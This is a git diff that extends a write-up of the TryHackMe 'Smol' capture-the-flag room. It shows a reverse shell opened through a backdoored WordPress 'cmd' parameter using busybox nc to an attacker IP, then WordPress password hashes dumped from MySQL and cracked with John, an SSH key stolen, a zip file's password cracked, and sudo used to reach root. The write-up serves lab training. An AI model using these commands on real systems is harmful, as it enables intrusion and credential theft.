@@ -181,14 +181,233 @@ This code is checking if the `cmd` parameter exists in the URL query string. If 
 http://www.smol.thm/wp-admin/edit.php?cmd=ls
 ```
 
-Now, lets try to get a reverse shell:
+#### Get a Reverse Shell
+**On Website**
 ```bash
+http://www.smol.thm/wp-admin/edit.php?cmd=busybox%20nc%2010.14.101.2%204444%20-e%20sh
+```
+- `busybox` with the `URL Encode` is used to get a reverse shell. 
 
+**On Local Machine**
+```bash
+nc -nvlp 4444
 ```
 
+We received a shell back and upgraded the shell afterwards which gave us an interactive shell.
 
+![[Shell.png]]
 
+I checked the process running on the system.
+```bash 
+ps aux 
 
+# Output
+mysql        888  0.4 10.7 1795728 426436 ?      Ssl  01:43   0:10 /usr/sbin/mysqld
+```
+
+MySql service is running and lets login with the creds found earlier `wpuser:kbLSF2Vop#lw3rjDZ629*Z%G`
+```bash
+mysql -u wpuser -p
+```
+
+We're now inside MySql and enumerate to find useful information.
+```mysql
+show database;
+
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| sys                |
+| wordpress          |
++--------------------+
+5 rows in set (0.00 sec)
+```
+
+There's a `wordpress` database which we can enumerate.
+```mysql
+use wordpress;
+show tables;
++---------------------------+
+| Tables_in_wordpress       |
++---------------------------+
+| wp_users                  |
++---------------------------+
+42 rows in set (0.00 sec)
+```
+- This gives us a huge table but it has `wp_users` table which we can look into.
+
+Let's check what's inside `wp_users.`
+```mysql
+# Use this command to check the headings
+select * from wp_users
+
+# Use this command to select the headings you want to see
+select user_login, user_pass from wp_users;
++------------+------------------------------------+
+| user_login | user_pass                          |
++------------+------------------------------------+
+| admin      | $P$BH.CF15fzRj4li7nR19CHzZhPmhKdX. |
+| wpuser     | $P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E. |
+| think      | $P$BOb8/koi4nrmSPW85f5KzM5M/k2n0d/ |
+| gege       | $P$B1UHruCd/9bGD.TtVZULlxFrTsb3PX1 |
+| diego      | $P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1 |
+| xavi       | $P$BB4zz2JEnM2H3WE2RHs3q18.1pvcql1 |
++------------+------------------------------------+
+6 rows in set (0.00 sec)
+```
+
+We've found the password list and now going to save it on our local machine in this format.
+```bash
+admin:$P$BH.CF15fzRj4li7nR19CHzZhPmhKdX.
+wpuser:$P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E.
+think:$P$BOb8/koi4nrmSPW85f5KzM5M/k2n0d/
+gege:$P$B1UHruCd/9bGD.TtVZULlxFrTsb3PX1
+diego:$P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1
+xavi:$P$BB4zz2JEnM2H3WE2RHs3q18.1pvcql1
+```
+
+### Crack the Password list with John
+```bash 
+john --wordlist=/usr/share/wordlists/rockyou.txt wp_users
+Created directory: /home/kali/.john
+Using default input encoding: UTF-8
+Loaded 6 password hashes with 6 different salts (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
+Cost 1 (iteration count) is 8192 for all loaded hashes
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+sandiegocalifornia (diego)  
+```
+
+We have found the password for the user `diego:sandiegocalifornia`.
+
+Let's switch user to `dieogo` and get the first flag.
+```bash
+su diego
+cd 
+cat user.txt
+```
+
+From there, we began to check the home folders for other users to find any useful information and found the `id_rsa` file in `think` user's.
+```bash
+ls -al gege ssm-user think xavi
+total 31532
+drwxr-x--- 2 gege internal     4096 Aug 18  2023 .
+drwxr-xr-x 8 root root         4096 Aug  2 03:47 ..
+lrwxrwxrwx 1 root root            9 Aug 18  2023 .bash_history -> /dev/null
+-rw-r--r-- 1 gege gege          220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 gege gege         3771 Feb 25  2020 .bashrc
+-rw-r--r-- 1 gege gege          807 Feb 25  2020 .profile
+lrwxrwxrwx 1 root root            9 Aug 18  2023 .viminfo -> /dev/null
+-rwxr-x--- 1 root gege     32266546 Aug 16  2023 wordpress.old.zip
+
+ssm-user:
+total 20
+drwxr-xr-x 2 ssm-user ssm-user 4096 Jul 20 11:11 .
+drwxr-xr-x 8 root     root     4096 Aug  2 03:47 ..
+-rw-r--r-- 1 ssm-user ssm-user  220 Jan 12  2024 .bash_logout
+-rw-r--r-- 1 ssm-user ssm-user 3771 Jan 12  2024 .bashrc
+-rw-r--r-- 1 ssm-user ssm-user  807 Jan 12  2024 .profile
+
+think:
+total 32
+drwxr-x--- 5 think internal 4096 Jan 12  2024 .
+drwxr-xr-x 8 root  root     4096 Aug  2 03:47 ..
+lrwxrwxrwx 1 root  root        9 Jun 21  2023 .bash_history -> /dev/null
+-rw-r--r-- 1 think think     220 Jun  2  2023 .bash_logout
+-rw-r--r-- 1 think think    3771 Jun  2  2023 .bashrc
+drwx------ 2 think think    4096 Jan 12  2024 .cache
+drwx------ 3 think think    4096 Aug 18  2023 .gnupg
+-rw-r--r-- 1 think think     807 Jun  2  2023 .profile
+drwxr-xr-x 2 think think    4096 Jun 21  2023 .ssh
+lrwxrwxrwx 1 root  root        9 Aug 18  2023 .viminfo -> /dev/null
+
+xavi:
+total 20
+drwxr-x--- 2 xavi internal 4096 Aug 18  2023 .
+drwxr-xr-x 8 root root     4096 Aug  2 03:47 ..
+lrwxrwxrwx 1 root root        9 Aug 18  2023 .bash_history -> /dev/null
+-rw-r--r-- 1 xavi xavi      220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 xavi xavi     3771 Feb 25  2020 .bashrc
+-rw-r--r-- 1 xavi xavi      807 Feb 25  2020 .profile
+lrwxrwxrwx 1 root root        9 Aug 18  2023 .viminfo -> /dev/null
+```
+
+I copied the `private key` and used ssh to login as the user `think`.
+```bash
+ssh -i id_rsa think@10.10.223.120
+```
+
+We're now inside the `think` user's home directory but we could not find anything. From our earlier listing of the home directories of other users, we found `wordpress.old.zip` inside the user `gege`.
+
+#### Switch to `gege`
+```bash
+su gege
+```
+
+We were not asked for any passwords. When we tried to unzip the file it asked for the password which we don't have. Let's transfer the file to out local machine to unzip the folder and see what's inside there. 
+
+#### SCP from Victim's machine to Kali
+```bash
+scp wordpress.old.zip kali@IP:/home/kali/tryhackme/smol
+```
+
+Once we have received the file, we can use the tool `zip2john` to crack the zip password with `John`. 
+```bash
+zip2john wordpress.old.zip > crack-zip
+```
+
+Now, it's time to crack the zip file's password.
+```bash
+john --wordlist=/usr/share/wordlist/rockyou.txt crack-zip
+Using default input encoding: UTF-8
+Loaded 1 password hash (PKZIP [32/64])
+Will run 4 OpenMP threads
+Press 'q' or Ctrl-C to abort, almost any other key for status
+hero_gege@hotmail.com (wordpress.old.zip)     
+1g 0:00:00:00 DONE (2025-08-02 19:55) 1.408g/s 10741Kp/s 10741Kc/s 10741KC/s hesse..hepiboth
+Use the "--show" option to display all of the cracked passwords reliably
+Session completed. 
+```
+
+Here is the password: `hero_gege@hotmail.com`. Now, `unzip` the file.
+```bash
+unzip wordpress.old.zip
+```
+
+There are a lot of files and folders. So, I used the following command to find any possible `password` related to the users in the system.
+```bash
+cd wordpress.old
+grep -ri "password" . | grep -Ei "gege|think|xavi"
+./wp-admin/install.php:				<?php /* translators: The non-breaking space prevents 1Password from thinking the text "log in" should trigger a password save prompt. */ ?>
+./wp-config.php:define( 'DB_PASSWORD', 'P@ssw0rdxavi@' );
+```
+
+We've found the password for the user `xavi:P@ssw0rdxavi@`.
 
 ---
-### Privilege Escalation
+### Privilege Escalation to Root
+Since we have found the `xavi's` password, let's switch to his account.
+```bash
+su xavi
+```
+
+#### Check for the Sudo Privilege
+```bash
+sudo -l
+Matching Defaults entries for xavi on ip-10-10-26-23:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User xavi may run the following commands on ip-10-10-26-23:
+    (ALL : ALL) ALL
+```
+
+We can see the `xavi` is in the sudoers list. Now, we can just switch user to `root` and read the `root.txt` file.
+```bash
+sudo su
+cd /root
+cat root.txt
+```
+
